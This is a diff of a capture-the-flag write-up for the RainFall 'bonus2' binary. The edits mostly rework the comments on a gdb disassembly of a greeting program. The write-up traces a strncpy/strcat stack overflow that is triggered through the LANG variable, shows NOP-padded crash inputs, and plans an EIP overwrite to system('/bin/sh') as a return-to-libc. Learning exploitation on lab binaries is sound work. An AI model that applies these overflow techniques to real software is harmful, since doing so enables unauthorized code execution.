@@ -69,7 +69,7 @@ All defined variables:
 
 Non-debugging symbols:
 [...]
-0x08049988  language                   <-- custom var 
+0x08049988  language                   <-- custom var
 ```
 
 ### disas main
@@ -104,64 +104,63 @@ Dump of assembler code for function main:
    0x0804852d <+4>:	push   esi
    0x0804852e <+5>:	push   ebx
    0x0804852f <+6>:	and    esp,0xfffffff0
-   0x08048532 <+9>:	sub    esp,0xa0                     <-- Allocating 160 bytes on main
-   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3      <-- test if argc == 3
-   0x0804853c <+19>:	je     0x8048548 <main+31>	    <-- TRUE, continue at +31
-   0x0804853e <+21>:	mov    eax,0x1                      <-- FALSE, store 1 in eax
-   0x08048543 <+26>:	jmp    0x8048630 <main+263>         <-- FALSE, continue at +263 (return(1))
-   0x08048548 <+31>:	lea    ebx,[esp+0x50]		    <-- esp with offset of 80, pointer to buffer
-   0x0804854c <+35>:	mov    eax,0x0                      <-- prepare value for repstos
-   0x08048551 <+40>:	mov    edx,0x13			    <-- put 19 in edx 
-   0x08048556 <+45>:	mov    edi,ebx			    <-- give buffer to bzero
-   0x08048558 <+47>:	mov    ecx,edx			    <-- feed length of 19 to bzero
-   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax     <-- optimised call to bzero
-   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]      <-- get address at base + 12 (char **argv)
-   0x0804855f <+54>:	add    eax,0x4			    <-- increase address of argv by 4 bytes (*argv + 1)
-   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]          <-- get that address 
-   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28     <-- feed value of 40 to strncpy
-   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax      <-- feed argv[1] (or *argv + 1) to strncpy
-   0x08048570 <+71>:	lea    eax,[esp+0x50]		    <-- load buffer address
-   0x08048574 <+75>:	mov    DWORD PTR [esp],eax	    <-- feed buffer to strncpy
-   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>      <-- strncpy(buffer, argv[1], 40)
-   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]      <-- get address at base + 12 (char **argv)
-   0x0804857f <+86>:	add    eax,0x8                      <-- increase address of argv by 8 bytes (*argv + 2)
-   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]          <-- get that address 
-   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20     <-- feed value of 32 to strncpy
-   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax      <-- feed argv[1] (or *argv + 1) to strncpy
-   0x08048590 <+103>:	lea    eax,[esp+0x50]               <-- load address of buffer
-   0x08048594 <+107>:	add    eax,0x28			    <-- increment buffer pointer by 40
-   0x08048597 <+110>:	mov    DWORD PTR [esp],eax	    <-- feed buffer to strncpy
-   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>      <-- strncpy(buffer + 40, argv[2], 32)
-   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738    <-- "LANG"
-   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>       <-- getenv("LANG")
-   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax     <-- retrieve returned value in local var
-   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0     <-- test if localvar == 0 (getenv can return NULL)
-   0x080485ba <+145>:	je     0x8048618 <main+239>         <-- TRUE, continue at 239
-   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2	    <-- feed 2 to memcmp 
-   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d<-- "fi"
-   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]     <-- put address of local var in eax
-   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax          <-- get address returned by getenv
-   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>       <-- memcmp(envstr, "fi", 2)
-   0x080485db <+178>:	test   eax,eax                      <-- test if memcmp(envstr, "fi", 2) == 0 
-   0x080485dd <+180>:	jne    0x80485eb <main+194>         <-- FALSE, continue at +194
-   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1   <-- TRUE, put 1 in global symbol "language" 
-   0x080485e9 <+192>:	jmp    0x8048618 <main+239>         <-- TRUE, continue at +239 
-   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2      <-- feed 2 to memcmp 
-   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740<-- "nl"
-   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]     <-- put address of local var in eax
-   0x08048602 <+217>:	mov    DWORD PTR [esp],eax          <-- get address returned by getenv
-   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>       <-- memcmp(envstr, "nl", 2)
-   0x0804860a <+225>:	test   eax,eax                      <-- test if memcmp(envstr, "nl", 2) == 0
-   0x0804860c <+227>:	jne    0x8048618 <main+239>         <-- FALSE, continue at +239
-   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2   <-- TRUE, put 2 in global symbol "language"
+   0x08048532 <+9>:	sub    esp,0xa0                           <-- Space of 160 bytes for the stack frame
+   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3            <-- Compare int argc with 3
+   0x0804853c <+19>:	je     0x8048548 <main+31>	               <-- If equal jump to main+31
+   0x0804853e <+21>:	mov    eax,0x1                            <-- Store 1 in eax (return (1))
+   0x08048543 <+26>:	jmp    0x8048630 <main+263>               <-- Exit return(1)
+   0x08048548 <+31>:	lea    ebx,[esp+0x50]                     <-- Load char buffer[72];
+   0x0804854c <+35>:	mov    eax,0x0                            <-- Prepare value for repstos
+   0x08048551 <+40>:	mov    edx,0x13                           <-- Put 19 in edx
+   0x08048556 <+45>:	mov    edi,ebx                            <-- Give buffer to memset()
+   0x08048558 <+47>:	mov    ecx,edx                            <-- Feed length of 19 to memset()
+   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax           <-- Optimised call to memset(buffer, '\0', 19)
+   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]            <-- Load char *argv[]
+   0x0804855f <+54>:	add    eax,0x4                            <-- Add 4 to char *argv[]
+   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]                <-- Load char *argv[1]
+   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28           <-- Set 40 as 3rd argument to strncpy()
+   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax            <-- Set char *argv[2] to 2nd argument to strncpy()
+   0x08048570 <+71>:	lea    eax,[esp+0x50]                     <-- Load char buffer[72];
+   0x08048574 <+75>:	mov    DWORD PTR [esp],eax                <-- Set char buffer[72] to 1st argument to strncpy()
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>            <-- Call to strncpy(buffer, argv[1], 40)
+   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]            <-- Load char *argv[]
+   0x0804857f <+86>:	add    eax,0x8                            <-- Add 8 to char *argv[]
+   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]                <-- Load char *argv[2]
+   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20           <-- Set 32 as 3rd argument to strncpy()
+   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax            <-- Set char *argv[2] to 2nd argument to strncpy()
+   0x08048590 <+103>:	lea    eax,[esp+0x50]                  <-- Load char buffer[72];
+   0x08048594 <+107>:	add    eax,0x28                        <-- Add 40 to char buffer[72]
+   0x08048597 <+110>:	mov    DWORD PTR [esp],eax             <-- Set char buffer[72] + 40 to 1st argument to strncpy()
+   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>         <-- Call to strncpy(buffer + 40, argv[2], 32)
+   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738       <-- Set "LANG" to 1st argument to getenv()
+   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>          <-- Call to getenv("LANG")
+   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax        <-- Store return value of getenv() in esp+0x9c
+   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0        <-- Compare if return value of getenv() is 0
+   0x080485ba <+145>:	je     0x8048618 <main+239>            <-- If equal jump to main+239
+   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2         <-- Else continue, set 2 as 3rd argument to memcmp()
+   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d   <-- Set "fi" as 2nd argument to memcmp()
+   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]        <-- Store addres of return value of getenv() in eax
+   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax             <-- Set char *env to 1st argument to memcmp()
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>          <-- Call to memcmp(env, "fi", 2)
+   0x080485db <+178>:	test   eax,eax                         <-- Test if memcmp(envstr, "fi", 2) == 0
+   0x080485dd <+180>:	jne    0x80485eb <main+194>            <-- If not equal, jump +194
+   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1      <-- Else, Set 1 to int language
+   0x080485e9 <+192>:	jmp    0x8048618 <main+239>            <-- <else if>
+   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2         <-- Set 2 as 3rd argument to memcmp()
+   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740   <-- Set "nl" as 2nd argument to memcmp()
+   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]        <-- Load return value of getenv() in eax
+   0x08048602 <+217>:	mov    DWORD PTR [esp],eax             <-- Set char *env to 1st argument to memcmp()
+   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>          <-- Call to memcmp(envstr, "nl", 2)
+   0x0804860a <+225>:	test   eax,eax                         <-- Test if memcmp(envstr, "nl", 2) == 0
+   0x0804860c <+227>:	jne    0x8048618 <main+239>            <-- If not equal, jump +239
+   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2      <-- Else set 2 to int language
    0x08048618 <+239>:	mov    edx,esp
-   0x0804861a <+241>:	lea    ebx,[esp+0x50]               <-- load buffer to ebx
-   0x0804861e <+245>:	mov    eax,0x13			    <-- put 19 in eax 
+   0x0804861a <+241>:	lea    ebx,[esp+0x50]                  <-- Load char buffer[72];
+   0x0804861e <+245>:	mov    eax,0x13
    0x08048623 <+250>:	mov    edi,edx
-   0x08048625 <+252>:	mov    esi,ebx			    <-- feed buffer to strncpy
-   0x08048627 <+254>:	mov    ecx,eax			    <-- feed 19 to strncpy
-   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
-   0x0804862b <+258>:	call   0x8048484 <greetuser>        <-- greetuser (returned address of strncpy)
+   0x08048625 <+252>:	mov    esi,ebx
+   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] /!\ Some compilation optimisation to copy the buffer into the greetuser arguments
+   0x0804862b <+258>:	call   0x8048484 <greetuser>           <-- Call to greetuser(buffer)
    0x08048630 <+263>:	lea    esp,[ebp-0xc]
    0x08048633 <+266>:	pop    ebx
    0x08048634 <+267>:	pop    esi
@@ -184,27 +183,27 @@ gdb-peda$ disas greetuser
 Dump of assembler code for function greetuser:
    0x08048484 <+0>:	push   ebp
    0x08048485 <+1>:	mov    ebp,esp
-   0x08048487 <+3>:	sub    esp,0x58                  <-- allocate 88 on greetuser stack 
-   0x0804848a <+6>:	mov    eax,ds:0x8049988          <-- move value in global var language in eax
-   0x0804848f <+11>:	cmp    eax,0x1			 <-- test if (language == 1)
-   0x08048492 <+14>:	je     0x80484ba <greetuser+54>  <-- TRUE, continue at +54
-   0x08048494 <+16>:	cmp    eax,0x2			 <-- test if (language == 2)
-   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> <-- TRUE, continue at +101
-   0x08048499 <+21>:	test   eax,eax                   <-- test if (language == 0)
-   0x0804849b <+23>:	jne    0x804850a <greetuser+134> <-- TRUE, continue at +134
-   0x0804849d <+25>:	mov    edx,0x8048710             <-- move static string "Hello " to edx
-   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
-   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
-   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
+   0x08048487 <+3>:	sub    esp,0x58                           <-- Space of 88 bytes for the stack frame
+   0x0804848a <+6>:	mov    eax,ds:0x8049988                   <-- Load int language from ds:0x8049988
+   0x0804848f <+11>:	cmp    eax,0x1                            <-- Compare if int language == 1
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54>           <-- If equal, jump to greetuser+54
+   0x08048494 <+16>:	cmp    eax,0x2                            <-- Compare if int language == 2
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>          <-- If equal, jump to greetuser+101
+   0x08048499 <+21>:	test   eax,eax                            <-- Test if int language == 0
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134>          <-- If not equal, jump to greetuser+134
+   0x0804849d <+25>:	mov    edx,0x8048710                      <-- Load "Hello "
+   0x080484a2 <+30>:	lea    eax,[ebp-0x48]                     <-- Load address of char tmp[72];
+   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]                <-- Optimized inline strcpy() "Hello " to char *tmp
+   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx                    Call strcpy(tmp, "Hello ")
    0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
    0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
    0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
-   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
+   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl              <-- End optimized inline strcpy(tmp, "Hello ")
    0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
-   0x080484ba <+54>:	mov    edx,0x8048717             <-- move static string "Hyvää päivää " to edx
-   0x080484bf <+59>:	lea    eax,[ebp-0x48]
-   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
-   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
+   0x080484ba <+54>:	mov    edx,0x8048717                      <-- Load "Hyvää päivää "
+   0x080484bf <+59>:	lea    eax,[ebp-0x48]                     <-- Load address of char tmp[72];
+   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]                <-- Optimized inline strcpy() "Hyvää päivää " to char *tmp ...
+   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx                    Call strcpy(tmp, "Hyvää päivää ")
    0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
    0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
    0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
@@ -214,27 +213,27 @@ Dump of assembler code for function greetuser:
    0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
    0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
    0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
-   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
+   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl             <-- End optimized inline strcpy(tmp, "Hyvää päivää ")
    0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
-   0x080484e9 <+101>:	mov    edx,0x804872a             <-- move static string "Goedemiddag! " to edx
-   0x080484ee <+106>:	lea    eax,[ebp-0x48]
-   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
-   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
+   0x080484e9 <+101>:	mov    edx,0x804872a                   <-- Load "Goedemiddag! "
+   0x080484ee <+106>:	lea    eax,[ebp-0x48]                  <-- Load address of char tmp[72];
+   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]             <-- Optimized inline strcpy() "Goedemiddag! " to char *tmp
+   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx                 Call strcpy(tmp, "Goedemiddag! ")
    0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
    0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
    0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
    0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
    0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
-   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
+   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx           <-- End optimized inline strcpy(tmp, "Goedemiddag! ")
    0x08048509 <+133>:	nop
-   0x0804850a <+134>:	lea    eax,[ebp+0x8]             <-- load address of argument to the function
-   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax   <-- feed argument to strcat
-   0x08048511 <+141>:	lea    eax,[ebp-0x48]            <-- load address of local variable
-   0x08048514 <+144>:	mov    DWORD PTR [esp],eax       <-- feed local var to strcat
-   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
-   0x0804851c <+152>:	lea    eax,[ebp-0x48]
-   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
-   0x08048522 <+158>:	call   0x8048390 <puts@plt>
+   0x0804850a <+134>:	lea    eax,[ebp+0x8]                   <-- Load char *buffer
+   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax         <-- Set char *buffer as 2nd argument to strcat()
+   0x08048511 <+141>:	lea    eax,[ebp-0x48]                  <-- Load address of char tmp[72]
+   0x08048514 <+144>:	mov    DWORD PTR [esp],eax             <-- Set char *tmp as 1st argument to strcat()
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>          <-- Call strcat(tmp, buffer)
+   0x0804851c <+152>:	lea    eax,[ebp-0x48]                  <-- Load address of char tmp[72]
+   0x0804851f <+155>:	mov    DWORD PTR [esp],eax             <-- Set char *tmp as 1st argument to puts()
+   0x08048522 <+158>:	call   0x8048390 <puts@plt>            <-- Call puts(tmp)
    0x08048527 <+163>:	leave
    0x08048528 <+164>:	ret
 End of assembler dump.
@@ -254,7 +253,7 @@ run $(python -c "print '\x90'*40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4
 
 > ***NB: we feed the first argument with 40 NOP bytes because ***
 
-## "Hello" 
+## "Hello"
 
 ```gdb
 [----------------------------------registers-----------------------------------]
@@ -330,7 +329,7 @@ We have asserted the respective offsets of the buffer for each case of the execu
 
 We know that the EIP is overwritten only when the Greeting Message is of length 13 (either "fi" or "nl").
 
-So we can now decide how to exploit the binary. Since we know that the program will crash with an input of length 14 or above. 
+So we can now decide how to exploit the binary. Since we know that the program will crash with an input of length 14 or above.
 
 ```shell-session
 bonus2@RainFall:~$ LANG="fi" ./bonus2 $(python -c "print '\x90'*40")
@@ -343,10 +342,10 @@ Segmentation fault (core dumped)
 
 Since we can overwrite EIP with any address we see fit we could either:
 - make it point to a shellcode in the environment
-- make it point to the address of `system(/bin/sh)` 
+- make it point to the address of `system(/bin/sh)`
 
 Lets try the latter:
-- address of `system`: 
+- address of `system`:
    ```gdb
    gdb-peda$ info function system
    All functions matching regular expression "system":
